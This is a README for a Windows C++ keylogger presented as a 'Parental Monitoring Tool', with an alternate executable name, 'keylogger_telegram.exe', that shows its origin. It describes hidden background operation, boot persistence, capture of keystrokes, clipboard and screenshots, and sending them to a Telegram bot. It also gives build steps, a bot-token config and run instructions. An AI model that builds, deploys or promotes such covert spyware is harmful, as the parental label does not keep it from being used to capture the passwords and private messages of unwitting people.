# Parental Monitoring Tool

This project is a C++ application designed for the Windows operating system, intended to help parents monitor their children's computer activity for safety and responsible usage. It captures keystrokes, window titles, and clipboard content, and securely sends this information to a Telegram bot controlled by the parent.

## Features

*   **Background Operation:** Runs discreetly in the background without a visible window.
*   **Persistence:** Can be configured to start automatically on system boot, ensuring continuous monitoring. This feature is controllable via Telegram commands.
*   **Remote Control via Telegram:** Parents can issue commands to the monitoring tool through a Telegram bot:
    *   `/start`: Initiates the monitoring process.
    *   `/persistence_enable`: Activates automatic startup on system boot.
    *   `/persistence_disable`: Deactivates automatic startup.
    *   `/screenshot`: Captures a screenshot of the child's desktop and sends it to the parent's Telegram bot.
*   **Activity Logging:** Records keystrokes, window titles, and clipboard content to help parents understand computer usage patterns.

## Building the Project

To build this project, you will need:

*   A C++ compiler that supports C++17 (e.g., Visual Studio 2019 or later).
*   CMake (version 3.15 or later).
*   Ninja (optional, but recommended).

The project uses a root `CMakeLists.txt` file that handles building the application and its dependencies.

1.  **Create a build directory:**
    ```bash
    mkdir build
    cd build
    ```

2.  **Configure CMake and build:**
    ```bash
    # This example is for Ninja.
    # Adjust the generator for your compiler if needed.
    cmake .. -G "Ninja"
    cmake --build . --config Release
    ```

This will create the `parental_monitor.exe` executable (or `keylogger_telegram.exe` if not renamed in CMake) in the `build` directory. All necessary DLLs from the `cpr` library will be alongside it.

## Configuration

Before deploying the monitoring tool, you **MUST** create and configure a `config.ini` file in the same directory as the executable. This file will contain the credentials for the Telegram bot that the parent will use for control and receiving alerts.

1.  Create a file named `config.ini`.
2.  Add the following content, replacing the placeholder values with your Telegram bot's token and your chat ID:
    ```ini
    [Telegram]
    BotToken=YOUR_BOT_TOKEN_HERE
    ChatID=YOUR_CHAT_ID_HERE
    ```

## Running the Parental Monitoring Tool

To run the tool, simply execute the `parental_monitor.exe` (or `keylogger_telegram.exe`) file from the `build` directory.

```bash
./parental_monitor.exe
```

The program will run in the background. It logs activity to `log.txt` and periodically sends updates to the configured Telegram chat.
